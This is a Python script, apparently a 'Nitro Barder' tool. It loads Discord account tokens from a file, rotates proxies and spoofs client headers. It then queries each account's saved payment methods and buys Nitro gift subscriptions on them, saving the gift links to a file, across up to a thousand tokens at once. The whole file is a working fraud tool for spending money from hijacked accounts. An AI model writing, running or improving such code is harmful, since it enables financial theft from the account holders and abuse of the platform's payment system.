from turtle import title
from weakref import proxy
from pystyle import Center, Colorate, Colors
import hashlib, tasksio, aiohttp, asyncio, logging, sys, os, time
from datetime import datetime


logging.basicConfig(
     level=logging.INFO,
     format="\x1b[34;5;9m[\x1b[34m%(asctime)s\x1b[34;5;9m]\x1b[34m %(message)s\x1b[34m",
     datefmt="%H:%M:%S"
)

class Discord(object):

    def __init__(self):
        if sys.platform == "linux":
            os.system("clear")
        else:
            os.system("cls")

        self.tokens = []

        try:
            for line in open("tokens.txt"):
                self.tokens.append(line.replace("\n", ""))
        except Exception:
            open("tokens.txt", "a+").close()
            logging.info("Please insert your tokens \x1b[38;5;9m(\x1b[0mtokens.txt\x1b[38;5;9m)\x1b[0m")
            sys.exit()

        print(
            Center.XCenter(
                Colorate.Vertical(
                    Colors.blue_to_purple,
                    f"""


            ███╗░░██╗██╗████████╗██████╗░░█████╗░  ██████╗░░█████╗░██████╗░██████╗░███████╗██████╗░
            ████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗  ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
            ██╔██╗██║██║░░░██║░░░██████╔╝██║░░██║  ██████╦╝███████║██████╔╝██║░░██║█████╗░░██████╔╝
            ██║╚████║██║░░░██║░░░██╔══██╗██║░░██║  ██╔══██╗██╔══██║██╔══██╗██║░░██║██╔══╝░░██╔══██╗
            ██║░╚███║██║░░░██║░░░██║░░██║╚█████╔╝  ██████╦╝██║░░██║██║░░██║██████╔╝███████╗██║░░██║
            ╚═╝░░╚══╝╚═╝░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░  ╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝

        """,
                    1,
                )
            )
        )

        self.nitro_type = input("\033[1;31;40m ? Select Nitro Service ->  ")
        self.nitro_duration = input("\033[1;34;40m ? Select Nitro Duration -> ")
        self.proxy_type = input("\033[4m Proxy Type\n\033[24m|1.Auth\n|2.No Auth\n|3.Proxyless\n|-> ")

        if self.nitro_type.lower() == ("classic"):
            if self.nitro_duration.lower() == "month":
                self.nitro_id = "521846918637420545"
                self.sku_id = "511651871736201216"
                self.nitro_price = "499"
            elif self.nitro_duration.lower() == "year":
                self.nitro_id = "521846918637420545"
                self.sku_id = "511651876987469824"
                self.nitro_price = "4999"
            else:
                logging.info("Invalid nitro duration")
                input()
                sys.exit()
        elif self.nitro_type.lower() == "boost":
            if self.nitro_duration.lower() == "month":
                self.nitro_id = "521847234246082599"
                self.sku_id = "511651880837840896"
                self.nitro_price = "999"
            elif self.nitro_duration.lower() == "year":
                self.nitro_id = "521847234246082599"
                self.sku_id = "511651885459963904"
                self.nitro_price = "9999"
            else:
                logging.info("Invalid nitro duration")
                input()
                sys.exit()
        else:
            logging.info("Invalid nitro type")
            input()
            sys.exit()

        if self.proxy_type == ("1"):
            proxie_file = open("proxies.txt").read().splitlines()
            for x in proxie_file:
                user = x.split(":")[0]
                password = x.split(":")[1]
                ip = x.split(":")[2]
                port = x.split(":")[3]
            self.client_proxy = (f"http://{user}:{password}@{ip}:{port}")
                
        elif self.proxy_type == ("2"):
            proxie_file = open("proxies.txt").read().splitlines()
            for x in proxie_file:
                ip = x.split(":")[0]
                port = x.split(":")[1]
            self.client_proxy = (f"http://{ip}:{port}")

        elif self.proxy_type == ("3"):
            self.proxy_type = None
        else:
            logging.info("Invalid Proxie Type")
            input()
            sys.exit()

        print()

    def headers(self, token: str):
        headers = {
            "Authorization": token,
            "accept": "*/*",
            "accept-language": "en-US",
            "connection": "keep-alive",
            "cookie": "__cfduid=%s; __dcfduid=%s; locale=en-US" % (os.urandom(43).hex(), os.urandom(32).hex()),
            "DNT": "1",
            "origin": "https://discord.com",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "referer": "https://discord.com/channels/@me",
            "TE": "Trailers",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36",
            "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
        }
        return headers

    async def payments(self, token):
        result = []
        try:
            async with aiohttp.ClientSession(headers=self.headers(token)) as client:
                async with client.get("https://discord.com/api/v9/users/@me/billing/payment-sources", proxy=self.client_proxy) as response:
                    json = await response.json()
                    if json != []:
                        valid = 0
                        for source in json:
                            try:
                                if source["invalid"] == False:
                                    valid += 1
                                    result.append(source["id"])
                            except Exception:
                                pass
                        if valid != 0:
                            logging.info("\033[1;32;40m %s vaild payment method(s)  \x1b[1;32;40m[\x1b[32m%s\x1b[1;32;40m]\x1b[32m" % (valid, token[:59])) 
                            return result
                        else:
                            self.tokens.remove(token)
                    else:
                        logging.info("No payment source(s) \x1b[31;5;9m{\x1b[31m%s\x1b[31;5;9m}\x1b[31m" % (token[:59]))
                        self.tokens.remove(token)
        except Exception as e:
            print(f"Error -> {e}")

    async def purchase(self, token, source):
        async with aiohttp.ClientSession(headers=self.headers(token)) as client:
            async with client.post("https://discord.com/api/v9/store/skus/%s/purchase" % (self.nitro_id), json={"gift":True,"sku_subscription_plan_id":self.sku_id,"payment_source_id":source,"payment_source_token":None,"expected_amount":self.nitro_price,"expected_currency":"usd","purchase_token":"500fb34b-671a-4614-a72e-9d13becc2e95"}) as response:
                json = await response.json()
                if json.get("gift_code"):
                    logging.info("\033[1;32;40m Purchased Nitro \x1b[32;5;9m{\x1b[32m%s\x1b[32;5;9m}\x1b[32m" % (token[:59]))
                    with open("nitros.txt", "a+") as f:
                        f.write("https://discord.gift/%s\n" % (json.get("gift_code")))
                else:
                    if json.get("message"):
                        logging.info("\033[1;33;40m %s \x1b[31;5;9m{\x1b[31m%s\x1b[33;5;9m}\x1b[33m" % (json.get("message"), token[:59]))
                    else:
                        logging.info("\033[1;33;40m Failed To Purchase Nitro \x1b[33;5;9m{\x1b[35m%s\x1b[33;5;9m}\x1b[31m" % (token[:59]))

    async def task(self, token):
        sources = await self.payments(token)
        if sources == None:
            logging.info("\033[1;33;40m Insufficient Balance \x1b[33;5;9m{\x1b[31m%s\x1b[33;5;9m}\x1b[33m" % (token[:59]))
            return
        for x in sources:
            await self.purchase(token, x)

    async def start(self):
        async with tasksio.TaskPool(1_000) as pool:
            for token in self.tokens:
                    await pool.put(self.task(token))

if __name__ == "__main__":
    discord = Discord()
asyncio.get_event_loop().run_until_complete(discord.start())


